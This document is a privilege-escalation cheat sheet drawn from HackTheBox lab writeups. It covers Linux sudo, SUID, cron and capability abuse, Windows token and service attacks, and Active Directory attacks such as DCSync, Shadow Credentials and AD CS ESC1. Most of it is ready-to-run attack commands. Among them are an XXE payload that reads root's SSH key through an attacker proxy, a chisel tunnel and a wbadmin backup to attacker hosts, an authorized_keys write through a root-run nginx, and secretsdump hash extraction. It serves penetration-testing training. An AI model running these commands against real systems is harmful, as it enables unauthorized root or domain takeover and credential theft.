# Privilege escalation checklist

> Built from the 71 independently audited HTB writeups in this repository. Use only on systems you are authorized to test. Commands are templates: replace every `<PLACEHOLDER>` and verify the prerequisite before execution.

> Source links below resolve against this local workspace. The private text-only GitHub mirror intentionally does not publish the official PDFs or generated per-machine note files, so those links are not expected to open from the GitHub web view.

This sheet starts after a stable user shell. Search it by privilege, binary, AD edge, error string, CVE, or machine name. A discovered primitive is not yet an exploit: prove the execution identity, writable boundary, trigger, and expected result first.

## Five-minute escalation pass

### Linux

```bash
id; groups; umask
hostname; uname -a; cat /etc/os-release
sudo -n -l 2>/dev/null || sudo -l
command -v doas >/dev/null && { ls -l "$(command -v doas)"; cat /etc/doas.conf /usr/local/etc/doas.conf 2>/dev/null; }
find / -xdev -type f -perm -4000 -ls 2>/dev/null
getcap -r / 2>/dev/null
ps auxww
ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null
systemctl list-timers --all 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null
find /etc/systemd /usr/lib/systemd /lib/systemd -type f -writable -ls 2>/dev/null
find / -xdev \( -user root -o -group "$(id -gn)" \) -writable -ls 2>/dev/null
mount; findmnt
```

### Windows

```powershell
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture
Get-CimInstance Win32_Service | Select Name,StartName,State,PathName
schtasks /query /fo LIST /v
cmdkey /list
Get-NetTCPConnection -State Listen | Sort LocalPort
Get-ChildItem Env:
Get-ChildItem "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine" -Force
```

### Domain context

```powershell
whoami /user
whoami /groups
nltest /dsgetdc:<DOMAIN>
setspn -L "$env:COMPUTERNAME$"
klist
```

```bash
date -u
ntpdate <DC_IP>                     # use only when skew is confirmed
export KRB5CCNAME="$PWD/<TICKET>.ccache"
klist
```

Record before changing anything:

- Current user SID/UID, groups, privileges, integrity/effective UID, hostname, and logon type.
- Exact binary/script path, owner, mode/ACL, hash, version, architecture, arguments, working directory, environment, and trigger.
- Domain DNS name, DC hostname/IP, clock delta, ticket cache, SPN, and whether the target principal is `NOT_DELEGATED`.
- A rollback copy of every configuration, ACL, UPN, group membership, service path, template, or scheduled task you modify.

## Linux local escalation

### `sudo`, `doas`, and privileged wrappers

Checklist:

- [ ] Run `sudo -l` as the actual user, not through an incomplete shell.
- [ ] Preserve the command exactly: executable, fixed/wildcard arguments, `SETENV`, working directory, host restriction, and environment retained by `env_keep`.
- [ ] Inspect every file/module/plugin/config the allowed command reads.
- [ ] Determine whether it resolves a relative path, invokes a pager/editor, accepts a URL, parses XML, loads a package, or writes a file as root.
- [ ] Verify that the child process retains root; some programs deliberately drop privileges.

Pager escape ([Sau](./htb-writeups/Sau.pdf)):

```bash
sudo /usr/bin/systemctl status <SERVICE>
# Inside less, after confirming a pager opened:
!sh
id
```

If no pager appears, enlarge the terminal output or confirm `SYSTEMD_PAGER`/terminal behavior; changing the service is not the intended primitive.

SSH `LocalCommand` ([CozyHosting](./htb-writeups/CozyHosting.pdf)):

```bash
sudo /usr/bin/ssh \
  -o PermitLocalCommand=yes \
  -o 'LocalCommand=/bin/sh' \
  <VALID_USER>@127.0.0.1
```

`LocalCommand` runs only after a successful SSH connection. A dummy unreachable host or `ProxyCommand` is not equivalent.

GitPython `ext::` helper ([Editorial](./htb-writeups/Editorial.pdf)):

```bash
printf '%s\n' '<AUTHORIZED_PAYLOAD_COMMAND>' > /tmp/payload.sh
chmod 755 /tmp/payload.sh
sudo <EXACT_ALLOWED_CLONE_SCRIPT> 'ext::sh -c bash% /tmp/payload.sh'
```

GitPython's helper uses `%` in place of a literal space. Confirm that the allowed wrapper passes the clone URL to `Repo.clone_from`.

`easy_install`/package execution ([UpDown](./htb-writeups/UpDown.pdf)):

```bash
mkdir -p /tmp/pkg && cd /tmp/pkg
cat > setup.py <<'PY'
from setuptools import setup
import os
os.system('<AUTHORIZED_PAYLOAD_COMMAND>')
setup(name='auditpkg', version='1.0')
PY
sudo /usr/bin/easy_install /tmp/pkg
```

Privileged application interpreters:

```bash
sudo <BEE_PATH> --root=<BACKDROP_ROOT> eval '<PHP_ACTION>'   # Dog
sudo /bin/sh                                                # Mentor: only if sudo -l explicitly allows it
```

Do not generalize an application CLI into unrestricted sudo. Read its help, bootstrap path, and effective identity first.

### Relative paths and working-directory control

The exploit exists only when a privileged process calls an unqualified/relative executable and searches a directory you control.

```bash
strings <PRIVILEGED_BINARY> | less
strace -f -e execve <PRIVILEGED_COMMAND> 2>&1 | tee /tmp/execve.log
printf '#!/bin/sh\n<AUTHORIZED_PAYLOAD_COMMAND>\n' > /tmp/<MISSING_COMMAND>
chmod 755 /tmp/<MISSING_COMMAND>
PATH="/tmp:$PATH" <PRIVILEGED_TRIGGER>
```

Machine-specific traps:

- [Busqueda](./htb-writeups/Busqueda.pdf): the sudo wrapper calls cwd-controlled `./full-checkup.sh`. Put the file in a writable directory, `cd` there, then run the exact `full-checkup` action. Docker inspection only obtains the Gitea administrator secret; it is not a container escape.
- [Pandora](./htb-writeups/Pandora.pdf): if Matt's restricted shell prevents `pandora_backup`, escape through SUID `/usr/bin/at` first, then place a malicious `tar` in `/tmp`, prepend `/tmp` to `PATH`, and run the SUID backup binary.
- [Magic](./htb-writeups/Magic.pdf): SUID `/bin/sysinfo` invokes utilities by unqualified name; match the exact missing utility name.
- [Editor](./htb-writeups/Editor.pdf): the netdata-group SUID `ndsudo` resolves `nvme`; invoke its `nvme-list` action after placing the correct architecture executable earlier in `PATH`.

Verification:

```bash
type -a <COMMAND>
namei -l <RESOLVED_PATH>
file <PAYLOAD> <PRIVILEGED_BINARY>
id
```

### `doas` and plugin loading

[Soccer](./htb-writeups/Soccer.pdf) is a plugin-loader path, not unrestricted `doas`:

```bash
cat /usr/local/etc/doas.conf
/usr/bin/dstat --list
find <DSTAT_PLUGIN_DIRS> -maxdepth 1 -type d -writable -ls
cat > <WRITABLE_PLUGIN_DIR>/dstat_<PLUGIN>.py <<'PY'
import os
os.execl('/bin/sh', 'sh', '-p')
PY
doas /usr/bin/dstat --<PLUGIN>
```

The filename must be `dstat_<PLUGIN>.py`, and the permitted rule must cover the invoked `dstat` command.

### SUID and custom binaries

```bash
find / -xdev -type f -perm -4000 -printf '%M %u:%g %p\n' 2>/dev/null
file <SUID_BINARY>
ls -l <SUID_BINARY>
strings -a <SUID_BINARY> | less
ldd <SUID_BINARY> 2>/dev/null
readelf -d <SUID_BINARY> 2>/dev/null
strace -f -e file,process <SUID_BINARY> 2>&1 | tee /tmp/suid.trace  # diagnostic only
```

Tracing a SUID program as an unprivileged user can suppress its privilege transition for safety. Use `strace` to learn file/process behavior, but do not conclude that a binary fails to elevate merely because its traced execution retains your UID; verify normal execution separately.

Checklist:

- [ ] Confirm effective UID changes; many SUID programs drop it.
- [ ] Look for relative executables, writable configuration, plugins, environment-controlled paths, user-controlled filenames, and shell interpretation.
- [ ] Match architecture and library ABI.
- [ ] For a SUID shell copy, run it with `-p` or the shell may drop the effective UID.

Examples:

- [BoardLight](./htb-writeups/BoardLight.pdf): vulnerable root-owned Enlightenment 0.23.1 helper, CVE-2022-37706; verify the exact helper/version before using a PoC.
- [Dog](./htb-writeups/Dog.pdf): privileged `bee` PHP evaluation can create a SUID shell; execute the resulting shell with `-p`.
- [Pandora](./htb-writeups/Pandora.pdf): SUID `pandora_backup` resolves `tar` through `PATH`.
- [Clicker](./htb-writeups/Clicker.pdf): a custom SUID binary first leaks Jack's key; the final root path is the sudo `monitor.sh` XXE covered below.

### `SETENV`, proxy interception, and XXE

[Clicker](./htb-writeups/Clicker.pdf): `sudo -l` permits `SETENV` for `/opt/monitor.sh`. The script's privileged `curl` request is redirected through an attacker-controlled intercepting proxy; the response body is replaced with XML that reads root's key.

```bash
sudo -l
sed -n '1,240p' /opt/monitor.sh

# Configure the intercepting proxy on all interfaces at ATTACKER_IP:8080,
# intercept the response, and replace its body with:
cat > /tmp/xxe-response.xml <<'XML'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">
]>
<foo>&xxe;</foo>
XML

sudo http_proxy='http://<ATTACKER_IP>:8080' /opt/monitor.sh
# Copy the returned key without extra proxy/XML text, then:
chmod 600 ./root_id_rsa
ssh -i ./root_id_rsa root@<TARGET>
```

The payload belongs in the intercepted HTTP response, not in the original request. If no traffic reaches the proxy, re-check the lowercase `http_proxy` variable, `SETENV`, proxy bind address/firewall, and the script's curl URL.

### Linux capabilities

```bash
getcap -r / 2>/dev/null
getcap <BINARY>
```

Map the capability to the actual boundary. `cap_dac_read_search` bypasses read/search checks but does not automatically execute code. In [Intentions](./htb-writeups/Intentions.pdf), `/opt/scanner/scanner` becomes a byte oracle for `/root/.ssh/id_rsa`: compare candidate hashes/lengths, reconstruct the key, validate it, then SSH.

```bash
ssh-keygen -y -f ./id_rsa >/dev/null
chmod 600 ./id_rsa
ssh -i ./id_rsa root@<TARGET>
```

### Scheduled tasks, cron, and systemd

```bash
systemctl list-timers --all
systemctl list-unit-files --state=enabled
grep -RInE 'ExecStart|ExecStartPre|ExecStartPost|EnvironmentFile' /etc/systemd /usr/lib/systemd /lib/systemd 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron 2>/dev/null
pspy64
```

For every recurring process, check the task file, called scripts, interpreter, imports, working directory, output/log path, and every parent directory. Do not try to execute a protected task yourself when the privileged scheduler is already the trigger.

- [Markup](./htb-writeups/Markup.pdf): overwrite the exact writable `job.bat` path and wait for the Administrator task; `Log-Management` versus `LogManagement` matters.
- [Titanic](./htb-writeups/Titanic.pdf): compile the constructor payload specifically as `libxcb.so.1` inside `/opt/app/static/assets/images`; the recurring root `magick identify` loads it from its working directory. The payload creates `/tmp/sh`; run `/tmp/sh -p`.
- [TheFrizz](./htb-writeups/TheFrizz.pdf): a controlled GPO-linked computer scheduled task runs on the DC; validate the OU link and force policy refresh only after the task is staged.
- [Mailing](./htb-writeups/Mailing.pdf): the trigger is a privileged user opening the crafted LibreOffice document; host the payload and listener before placement.

### Writable imports and bytecode

[Browsed](./htb-writeups/Browsed.pdf) requires a legitimate Python bytecode header; merely copying a malicious `.pyc` is insufficient.

```bash
sudo <ALLOWED_TOOL_ONCE>                    # create legitimate cache
cp <CACHE>/extension_utils.cpython-312.pyc /tmp/legit.pyc
dd if=/tmp/legit.pyc of=/tmp/header.bin bs=1 count=16 status=none
dd if=/tmp/header.bin of=/tmp/malicious.pyc conv=notrunc status=none
rm <CACHE>/extension_utils.cpython-312.pyc
cp /tmp/malicious.pyc <CACHE>/extension_utils.cpython-312.pyc
sudo <ALLOWED_TOOL_AGAIN>
```

Match the interpreter tag (`cpython-312` here), import filename, first 16 bytes, owner/mode, and trigger.

### Symlinks, races, parsers, and privileged file writes

Before exploitation, answer: what path is checked, what path is later opened, under which identity, are symlinks followed, and what data is written or returned?

```bash
namei -l <PATH>
readlink -f <PATH>
inotifywait -m <PARENT_DIR>
lsof +D <PARENT_DIR> 2>/dev/null
```

Distinct cases—do not collapse them into “symlink abuse”:

- [LinkVortex](./htb-writeups/LinkVortex.pdf): `sudo clean_symlink.sh` has a check/use race. Export `CHECK_CONTENT=true` first because sudo preserves it through `env_keep`; otherwise the race may move the link without printing the target. Race a benign/broken `*.png` symlink to `/root/.ssh/id_rsa`, recover the key, and SSH.
- [Usage](./htb-writeups/Usage.pdf): deterministic 7-Zip `@listfile` parsing plus an `id_rsa` symlink, not a race. Place `@id_rsa` and the symlink in the privileged backup working directory; trigger the exact Project Backup option.
- [Monitored](./htb-writeups/Monitored.pdf): point the expected `phpmailer.log` path at `/root/.ssh/id_rsa`, run the allowed `getprofile.sh`, then extract the copied key from `profile.zip`.
- [Outbound](./htb-writeups/Outbound.pdf): sudo `below` writes through unsafe log handling; combine the writable log/error path, `/etc/passwd` symlink, and validated newline/account record while respecting blocked config/debug options.

### Root-run Nginx/WebDAV

[Broker](./htb-writeups/Broker.pdf): the boundary is arbitrary root-run Nginx configuration, not shared-library poisoning.

```nginx
user root;
events {}
http {
  server {
    listen 127.0.0.1:<PORT>;
    root /;
    dav_methods PUT;
    create_full_put_path on;
  }
}
```

```bash
ssh-keygen -t ed25519 -f /tmp/audit_key -N ''
sudo /usr/sbin/nginx -c /tmp/nginx.conf
ss -lntp | grep ':<PORT>'
curl -T /tmp/audit_key.pub http://127.0.0.1:<PORT>/root/.ssh/authorized_keys
chmod 600 /tmp/audit_key
ssh -i /tmp/audit_key root@127.0.0.1
```

If PUT fails, check compiled DAV support, URL-to-filesystem mapping, worker user, directory existence, and whether another Nginx instance owns the port.

### Kernel and local CVEs

```bash
uname -a
cat /proc/version
getconf LONG_BIT
gcc --version 2>/dev/null
```

- [Help](./htb-writeups/Help.pdf): match the kernel build, architecture, compiler, mitigations, and PoC prerequisites; “same distribution” is insufficient.
- [Sau](./htb-writeups/Sau.pdf): CVE-2023-26604 is the systemd/less pager boundary combined with sudo, not a standalone kernel exploit.

Prefer the narrowest, reversible primitive. Kernel exploitation is last, not first.

## Windows local escalation

### Identity, token, logon type, and integrity

```powershell
whoami /all
whoami /priv
whoami /groups
[Security.Principal.WindowsIdentity]::GetCurrent() | Format-List *
Get-CimInstance Win32_LogonSession | Select LogonId,LogonType,StartTime
klist
```

Do not treat “same username” as “same token”:

- WinRM normally gives a network/noninteractive logon. DPAPI, Credential Manager, GUI-process secrets, COM activation, and relay tooling may require an interactive, batch, service, or `runas /netonly` token.
- Group membership added after logon is absent from the current token. Log out and reconnect.
- `NT AUTHORITY\SYSTEM` is not always interchangeable with the named Administrator. EFS and user DPAPI keys are identity-bound.

[Absolute](./htb-writeups/Absolute.pdf) example:

```powershell
# 1. Evil-WinRM's network-logon token causes direct KrbRelay Access Denied.
# Enumerate an unused OXID resolver port first, then select a CLSID valid for this build.
.\CheckPort.exe

# 2. Prove Logon Type 9/runas-netonly can start an interactive-capable process.
.\RunasCs.exe <USER> -d <DOMAIN> <ARBITRARY_PASSWORD> -l 9 "qwinsta"

# 3. Relay that Type 9 Kerberos context to LDAP and perform the intended group write.
.\RunasCs.exe <USER> -d <DOMAIN> <ARBITRARY_PASSWORD> -l 9 \
  "C:\Path\KrbRelay.exe -spn ldap/<DC_FQDN> -clsid <VALID_CLSID> -port <FREE_PORT> -add-groupmember Administrators <USER>"
```

Logon type 9 (`runas /netonly`) does not validate the supplied password locally. Require `LDAP modified successfully`, then log out and reconnect so the new token includes the Administrators SID.

### Services and writable execution paths

```powershell
Get-CimInstance Win32_Service | Select Name,StartName,State,PathName
sc.exe qc <SERVICE>
sc.exe sdshow <SERVICE>
Get-Acl '<SERVICE_BINARY_OR_PARENT>' | Format-List
accesschk.exe -uwcqv <USER> <SERVICE>
accesschk.exe -uwdqs <USER> <SERVICE>
```

Only change a service if you have the service-control right and a reliable restart path. Record the original configuration first.

```powershell
sc.exe qc <SERVICE> > C:\Windows\Temp\<SERVICE>.before.txt
sc.exe config <SERVICE> binPath= "C:\Windows\Temp\<AUTHORIZED_PAYLOAD>.exe"
sc.exe stop <SERVICE>
sc.exe start <SERVICE>
```

- [Return](./htb-writeups/Return.pdf): Server Operators can reconfigure VSS; place the callback binary in a writable path, change `binPath`, restart VSS, verify SYSTEM, then restore the service.
- [ServMon](./htb-writeups/ServMon.pdf): NSClient++/NSCP loads the configured script as SYSTEM only after the configuration is saved and the service is fully restarted through Nadine's permitted control path.
- [Multimaster](./htb-writeups/Multimaster.pdf): Jorden's Server Operators membership enables SYSTEM service-path replacement; this is the primary path, while SeBackup/Zerologon are alternatives.

### Scheduled tasks and writable scripts

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | ForEach-Object {
  [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; User=$_.Principal.UserId; RunLevel=$_.Principal.RunLevel}
}
Get-Acl '<REFERENCED_SCRIPT>' | Format-List
```

Inspect the task action, executable, arguments, working directory, script, DLLs, and parent directories. In [Markup](./htb-writeups/Markup.pdf), overwrite the writable batch file and wait for the privileged trigger; do not waste time invoking the protected task manually.

### Saved credentials, DPAPI, browser, and process memory

Inventory:

```powershell
cmdkey /list
Get-ChildItem -Recurse "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem -Recurse "$env:APPDATA\Microsoft\Protect" -Force -ErrorAction SilentlyContinue
Get-Process | Sort ProcessName | Select ProcessName,Id,Path
Get-ChildItem -Recurse C:\Users -Include ConsoleHost_history.txt,key4.db,logins.json,*.kdbx,*.pfx,*.psafe3 -ErrorAction SilentlyContinue
```

Use the correct DPAPI scope and SID:

```bash
impacket-dpapi masterkey -file <MASTERKEY_FILE> -sid <USER_SID> -password '<USER_PASSWORD>'
impacket-dpapi credential -file <CREDENTIAL_BLOB> -key <MASTERKEY_SHA1>
```

- [Access](./htb-writeups/Access.pdf): derive the user's DPAPI masterkey from the exact SID/password, decrypt the matching saved Administrator credential, then open a new remote session.
- [Puppy](./htb-writeups/Puppy.pdf): transfer the binary credential blob and masterkey without corruption; Steph's plaintext password unlocks the user-scoped secret for `steph.cooper_adm`.
- [Heist](./htb-writeups/Heist.pdf): dump/search every Firefox parent/content PID; the privileged credential may not be in the first process.
- [Keeper](./htb-writeups/Keeper.pdf): after CVE-2023-32784 phrase recovery, preserve Unicode exactly. Convert the PuTTY key with `puttygen <KEYFILE> -O private-openssh -o id_rsa` before chmod/SSH.
- [Jeeves](./htb-writeups/Jeeves.pdf): the important KeePass entry is an Administrator NTLM hash, used for pass-the-hash; it is not a PuTTY key. Enumerate NTFS alternate streams with `dir /R` after Administrator access.

### PowerShell history and LAPS

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
Get-ADComputer <COMPUTER> -Properties ms-Mcs-AdmPwd,msLAPS-Password
```

The LAPS password is computer-specific and normally belongs to the host's local Administrator, not a domain account.

- [Timelapse](./htb-writeups/Timelapse.pdf): history exposes `svc_deploy`; its `LAPS_Readers` membership permits reading the DC computer's managed password.
- [StreamIO](./htb-writeups/StreamIO.pdf): join Core Staff first, then query the target computer's LAPS attribute.

### SeBackup/SeRestore and protected registry/domain files

Confirm enabled privileges:

```powershell
whoami /priv
reg.exe save HKLM\SAM C:\Windows\Temp\SAM.save /y
reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save /y
```

For domain files, use backup semantics rather than normal copy:

```powershell
wbadmin start backup -backuptarget:\\<ATTACKER>\<SHARE> -include:C: -quiet
# Or use an authorized DiskShadow/robocopy /B workflow when applicable.
```

```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM.save LOCAL
```

- [Cicada](./htb-writeups/Cicada.pdf): save SAM and SYSTEM under backup semantics, extract locally, and use the local Administrator context/hash.
- [Blackfield](./htb-writeups/Blackfield.pdf): back up/restore NTDS plus SYSTEM to an authenticated share. Use `wmiexec` with the recovered Administrator hash for the final session: `psexec` changes to SYSTEM, which cannot decrypt Administrator's EFS-protected `root.txt`.
- [Voleur](./htb-writeups/Voleur.pdf): locate the backup subsystem's NTDS/SYSTEM/SECURITY copies and extract offline; do not attempt Linux-local escalation on the backup host.

### SeImpersonate, coercion, and SSRF-assisted token capture

```powershell
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

Match exploit family to OS build, token privilege, available listener/coercion primitive, and endpoint reachability. Do not run a random Potato binary solely because the privilege is listed.

- [Cereal](./htb-writeups/Cereal.pdf): forward the localhost GraphQL service; `updatePlant` fetches `sourceURL`, which points at GenericPotato's local HTTP listener. Combine SSRF with the privileged token and launch the authorized SYSTEM payload.
- [Flight](./htb-writeups/Flight.pdf): the IIS virtual account authenticates to the network as the computer account. `Rubeus tgtdeleg` recovers the machine ticket; convert it to ccache and use the machine's replication rights rather than a generic Potato.

#### DarkZero: rebuild the service Logon Type 5 token

[DarkZero](./htb-writeups/DarkZero.pdf) requires a known plaintext password because `LOGON32_LOGON_SERVICE`/RunasCs cannot use only the existing ticket or hash. Preserve this order:

```powershell
# 1. As svc_sql on DC02, obtain the delegated TGT as one unwrapped Base64 value.
.\Rubeus.exe tgtdeleg /nowrap

# 2. Keep a pivot to DC02's internal network alive (example from the writeup).
.\chisel.exe client <ATTACKER_IP>:8080 R:socks
```

```bash
# 3. On the attacker, convert the complete Kirbi and use it through the pivot.
base64 -d svc_sql.kirbi.b64 > svc_sql.kirbi
impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME="$PWD/svc_sql.ccache"

# 4. Enroll the ordinary User template with the Kerberos cache.
proxychains -q certipy req -u svc_sql -k -no-pass \
  -target <DC02_FQDN> -ca '<TRUST_CA_NAME>' -template User

# 5. Authenticate the PFX to recover svc_sql's current NT hash.
proxychains -q certipy auth -pfx svc_sql.pfx \
  -domain <TRUST_DOMAIN> -dc-ip <DC02_INTERNAL_IP>

# 6. Choose a known plaintext password, derive its NT hash, then replace the account key.
pypykatz crypto nt '<KNOWN_PASSWORD>'
proxychains -q impacket-changepasswd \
  -hashes ':<CURRENT_SVC_SQL_NT_HASH>' -newhash ':<KNOWN_PASSWORD_NT_HASH>' \
  '<TRUST_DOMAIN>/svc_sql'@<DC02_FQDN>
```

```powershell
# 7. Back on DC02, create a service-logon token and retain UAC bypass behavior.
Invoke-RunasCs -Username svc_sql -Password '<KNOWN_PASSWORD>' -Domain <TRUST_DOMAIN> \
  -LogonType 5 -BypassUAC -Command 'whoami /priv'

# After verifying the service privileges, run only the authorized final command.
Invoke-RunasCs -Username svc_sql -Password '<KNOWN_PASSWORD>' -Domain <TRUST_DOMAIN> \
  -LogonType 5 -BypassUAC -Command '<AUTHORIZED_COMMAND>'
```

If the certificate request fails, verify `KRB5CCNAME`, internal DNS, tunnel/proxy routing, CA name, and that the ccache was made from the complete `/nowrap` ticket—not a wrapped/truncated console copy.

### UAC, integrity, and local Administrator

```powershell
whoami /groups | findstr /i "Mandatory Label Administrators"
whoami /priv
```

A local Administrators SID with medium integrity is not yet an elevated token. Reconnect after group changes. Treat `-BypassUAC`, token duplication, and service-logon paths as separate prerequisites.

### EFS and identity-bound data

```powershell
cipher /c C:\Users\Administrator\Desktop\root.txt
whoami
```

If a file is EFS-encrypted to Administrator, SYSTEM may still be unable to read it. Preserve or obtain the Administrator user context—[Blackfield](./htb-writeups/Blackfield.pdf) specifically requires WMIExec rather than PsExec for this reason.

### Windows application/client CVEs

- [Aero](./htb-writeups/Aero.pdf): CLFS CVE-2023-28252, matching build and Release x64 payload.
- [Mailing](./htb-writeups/Mailing.pdf): CVE-2023-2255 in LibreOffice requires the privileged user to open the placed `.odt` while the staging server/listener is ready.
- [Cerberus](./htb-writeups/Cerberus.pdf): ADSelfService Plus CVE-2022-47966 requires two values from different sources: decode the redirect's `SAMLRequest` for the assertion GUID, and recover `issuer_url` from the offline backup. Reverse only the backup basename, excluding `.ezip`, for its password.

## Active Directory and domain escalation

### Stabilize DNS, time, and ticket state first

```bash
printf '<DC_IP> <DC_SHORT> <DC_FQDN> <DOMAIN>\n' | sudo tee -a /etc/hosts
dig @<DC_IP> _kerberos._tcp.dc._msdcs.<DOMAIN> SRV
date -u
ntpdate <DC_IP>                         # only when skew is confirmed
export KRB5CCNAME="$PWD/<IDENTITY>.ccache"
klist
```

Kerberos failures are often state failures, not permission failures:

- `KRB_AP_ERR_SKEW`: synchronize with the DC, then request a fresh ticket. [Administrator](./htb-writeups/Administrator.pdf) hits this during targeted Kerberoasting.
- `KDC_ERR_PADATA_TYPE_NOSUPP`: the DC may not support PKINIT. Do not keep debugging the certificate; use Schannel/PassTheCert when the path permits it ([Authority](./htb-writeups/Authority.pdf)).
- `KDC_ERR_BADOPTION`: the requested delegation path lacks protocol transition, the initial ticket is not forwardable, or the target is non-delegable.
- A valid ticket for `cifs/DC` does not automatically authorize WinRM/HTTP. Match or substitute the service SPN deliberately.
- Keep one ccache per identity and print `klist` before every Kerberos-aware tool.

### BloodHound and evidence-backed ACL abuse

```bash
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> \
  -dc <DC_FQDN> -ns <DC_IP> -c All
```

For each edge, record source principal, target object, inherited/direct ACL, object type, and exact permitted operation. Re-collect after state changes.

Common Impacket templates (tool names may carry an `impacket-` prefix on your system):

```bash
owneredit.py -action write -new-owner '<CONTROLLED_USER>' -target '<TARGET_GROUP_OR_USER>' \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

dacledit.py -action write -rights FullControl -principal '<CONTROLLED_USER>' \
  -target '<TARGET_GROUP_OR_USER>' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

net rpc group addmem '<GROUP>' '<CONTROLLED_USER>' \
  -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_FQDN>
```

Examples:

- [Forest](./htb-writeups/Forest.pdf): control a user, join Exchange Windows Permissions/remote-management groups, then use the domain `WriteDACL` edge to grant DCSync rights.
- [Certified](./htb-writeups/Certified.pdf): Judith has `WriteOwner` on Management; ownership alone is insufficient. Take ownership, grant FullControl, add Judith to the group, then use Management's `GenericWrite` on `management_svc` for Shadow Credentials.
- [EscapeTwo](./htb-writeups/EscapeTwo.pdf): Ryan's `WriteOwner` over `ca_svc` requires ownership plus a password-reset ACL before resetting the account.
- [TombWatcher](./htb-writeups/TombWatcher.pdf): follow the exact ACL/certificate path to the ESC15-capable WebServer template; template schema/version matters.

Cleanup:

```bash
dacledit.py -action remove -rights FullControl -principal '<CONTROLLED_USER>' \
  -target '<TARGET>' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

Also restore ownership, passwords where authorized, group membership, SPNs, UPNs, and key credentials.

### Targeted Kerberoasting and AS-REP changes

```bash
targetedKerberoast.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' \
  --request-user '<TARGET_USER>' --dc-ip <DC_IP>

GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash <WORDLIST>
```

- [Administrator](./htb-writeups/Administrator.pdf): Emily's `GenericWrite` over Ethan permits a controlled SPN and targeted roast. If the request returns `KRB_AP_ERR_SKEW`, sync time and rerun. Ethan's cracked password then exposes DCSync rights.
- [Active](./htb-writeups/Active.pdf): crack the Administrator TGS to plaintext and use password-authenticated WMIExec/PsExec; this path does not recover an NTLM hash for pass-the-hash.
- [Multimaster](./htb-writeups/Multimaster.pdf): `GenericWrite` over Jorden can toggle pre-authentication or set an SPN; restore the changed attribute after obtaining the intended Kerberos material.

### DCSync and final execution context

Verify replication rights (`DS-Replication-Get-Changes` and `...-All`) before invoking DCSync.

```bash
secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_FQDN>' -just-dc-user Administrator
secretsdump.py -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<DC_FQDN>' -just-dc-user Administrator
wmiexec.py -hashes ':<ADMIN_NT_HASH>' '<DOMAIN>/Administrator@<DC_FQDN>'
```

Use the least disruptive remote method that preserves the required identity:

- [Sauna](./htb-writeups/Sauna.pdf): `svc_loanmgr` has replication rights; DCSync Administrator, then use the hash.
- [Forest](./htb-writeups/Forest.pdf): grant the controlled user replication rights through the proven `WriteDACL` path, then DCSync.
- [APT](./htb-writeups/APT.pdf): crack the NTLMv1 response to the `APT$` machine-account hash; that computer account can DCSync.
- [Blackfield](./htb-writeups/Blackfield.pdf): use WMIExec as Administrator rather than PsExec/SYSTEM because the final file is EFS-bound to Administrator.
- [Flight](./htb-writeups/Flight.pdf): the IIS app-pool/machine ticket provides the computer-account context used for replication.

### Shadow Credentials and PKINIT

Prerequisite: write access to the target's `msDS-KeyCredentialLink`.

```bash
pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' \
  --target '<TARGET_ACCOUNT>' --action add --dc-ip <DC_IP>

certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
  -account '<TARGET_ACCOUNT>' -dc-ip <DC_IP>
```

Save the generated PFX, password, ccache, and original key-credential state. Remove only the key credential you added.

- [Certified](./htb-writeups/Certified.pdf): Shadow Credentials first reach `management_svc`, then `ca_operator`; keep their PFX/ccache files separate.
- [Outdated](./htb-writeups/Outdated.pdf): ITStaff can write the key-credential link on `sflowers`, who has PSRemote access.
- [Absolute](./htb-writeups/Absolute.pdf): the route reaches `winrm_user`; final local-Administrators membership still requires the fresh-token step.

### AD CS discovery checklist

```bash
nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M adcs
certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -vulnerable -enabled -stdout
```

Record:

- CA name/DNS name and web/RPC enrollment reachability.
- Template enrollment rights, enabled state, schema version, EKUs, subject/SAN control, manager approval, authorized signatures, and SID security extension.
- CA officer/ManageCA rights and whether the CA globally omits the SID extension.
- The exact Certipy version; flags and behavior differ between releases.

### ESC1: enrollee-supplied subject

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

- [Escape](./htb-writeups/Escape.pdf): UserAuthentication permits arbitrary UPN; synchronize time before PKINIT.
